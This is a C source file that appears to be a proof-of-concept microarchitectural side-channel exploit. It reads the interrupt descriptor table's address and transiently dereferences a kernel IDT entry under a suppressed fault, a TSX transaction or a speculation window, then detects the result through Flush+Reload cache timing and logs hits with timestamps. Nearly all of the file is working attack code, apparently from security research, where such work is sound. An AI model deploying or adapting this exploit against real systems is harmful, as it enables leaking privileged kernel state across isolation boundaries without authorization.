#include "cacheutils.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TSX   0
#define FAULT 1
#define SPEC  2

#define HANDLER FAULT

#define speculation_start(label) asm goto ("call %l0" : : : "memory" : label##_retp); 
#define speculation_end(label) asm goto("jmp %l0" : : : "memory" : label); label##_retp: asm goto("lea %l0(%%rip), %%rax\nmovq %%rax, (%%rsp)\nret\n" : : : "memory","rax" : label); label: asm volatile("nop");


typedef struct {
  uint16_t limit;
  size_t base __attribute__((packed));
} idt_t;

char __attribute__((aligned(4096))) oracle[4096 * 256];
/* char __attribute__((aligned(4096))) evictor[4096 * 16]; */
char __attribute__((aligned(4096))) evictor[4096 * 100];

size_t hits = 0;

int stopping(int dummy) {
    /* printf("Hits: %zd\n", hits); */
    FILE* f = fopen("hits", "w");
    fprintf(f, "%zd\n", hits);
    fclose(f);
    exit(0);
}

int main(int argc, char *argv[]) {

  sleep(2);

  if (argc != 2) {
    printf("Usage: %s <IDT-entry-nr>\n", argv[0]);
    exit(1);
  }
  int offset = atoi(argv[1]);

  memset(oracle, 1, sizeof(oracle));
  memset(evictor, 2, sizeof(evictor));

  idt_t idt;
  asm volatile("sidt %0" : "=m"(idt) : : "memory");

  if (!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();

  signal(SIGSEGV, trycatch_segfault_handler);

  unsigned char *target = (unsigned char *)(idt.base + offset * 16);

  for (int i = 0; i < 256; i++)
    flush(oracle + i * 4096);
  int cnt = 0;
  
  signal(SIGINT, stopping);
  
  while (1) {
#if HANDLER == FAULT
    if (!setjmp(trycatch_buf)) {
      maccess(NULL);
#endif
      
#if HANDLER == TSX
    if (xbegin() == (~0u)) {
      maccess(NULL);
#endif
        
#if HANDLER == SPEC
    speculation_start(sp);
#endif
      maccess(oracle + !!(*target) * 4096);
      
#if HANDLER == TSX
      xend();
    }
#endif
#if HANDLER == FAULT
    }
#endif
#if HANDLER == SPEC
    speculation_end(sp);
#endif
    if (flush_reload(oracle + 4096)) {
       struct timeval time;
       gettimeofday(&time, NULL);
       printf("%ld\n", time.tv_sec * 1000000 + time.tv_usec);
       fflush(stdout);
        hits++;
      for (int ev = 0; ev < sizeof(evictor) / 4096; ev++) {
        maccess(evictor + ev * 4096 + offset * 16);
      }
      asm volatile("mfence");
    }
  }
}
